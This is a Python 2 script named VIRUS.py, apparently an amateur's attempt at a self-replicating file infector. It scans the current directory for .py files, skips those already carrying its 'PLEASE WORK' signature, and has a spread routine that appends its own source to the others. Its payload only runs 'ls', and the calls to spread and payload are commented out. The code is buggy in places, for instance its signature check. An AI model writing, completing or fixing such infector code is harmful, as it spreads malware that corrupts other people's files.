#!/usr/bin/python
import os  # this allows you to use os functionality (running commands)
import subprocess  # needed to run bash commands in the terminal

SIGNATURE = "PLEASE WORK"  # this is how I will tell if the file has been infected or not


def payload():  # this function will do the "bad" things
    # subprocess.call(["firefox", "https://www.youtube.com/watch?v=ZpjyH-LkEAg"])   #runs the bash commands
    subprocess.call(["ls"])


def spread(vulnerablefiles):
    virus = open(os.path.abspath(__file__))  # the __file__ contains the path to the file that is importing
    virusString = virus.readline()
    tempString = ""
    virusString = virus.read()
    # for i, line in enumerate(virus):
    # if 0 <= i < 50:  # this represents the number of lines in this program
    # virusString += line  # takes the line of code and stores it
    # virusString = virus.readline()
    # tempString += virusString
    #print(*vulnerablefiles)
    for i in list(vulnerablefiles):
        print vulnerablefiles
    #vulnerablefiles.remove('VIRUS.py')
    for filename in vulnerablefiles:
        file = open(filename)  # opens the target file
        temp = file.read()
        file.close()
        file = open(filename, "w")  # opens the file for writing
        file.write(temp + virusString)  # writes the line of code to the file           
        file.close()  # closes the file
        vulnerablefiles.remove(filename)
    virus.close()


def findvulnerablefiles(path):
    vulnerablefiles = []  # initializes an array for the vulnerable files
    filelist = os.listdir(path)  # this makes a list of files in the current directory
    filelist.remove('VIRUS.py')
    print filelist
    for filename in filelist:
        #if os.path.isdir(path + "/" + filename):  # this checks if the path is an existing directory or not
            #vulnerablefiles.extend(search(path + "/" + filename))  # adds the item to the list
        if filename[-3:] == ".py":
            infected = False  # this file is not infected
            fd = open(path + "/" + filename)
            for line in fd.readline():  # search the program
                if SIGNATURE in line:  # if my signature is in the program
                    infected = True  # in this case I've already infected the file
                    break
            if not infected:
               vulnerablefiles.append(path + "/" + filename)
        #filelist.remove(filename)
    print vulnerablefiles
    return vulnerablefiles


vulnerablefileslist = findvulnerablefiles(os.path.abspath(""))  # add files to the list to search
#spread(vulnerablefileslist)
#payload()
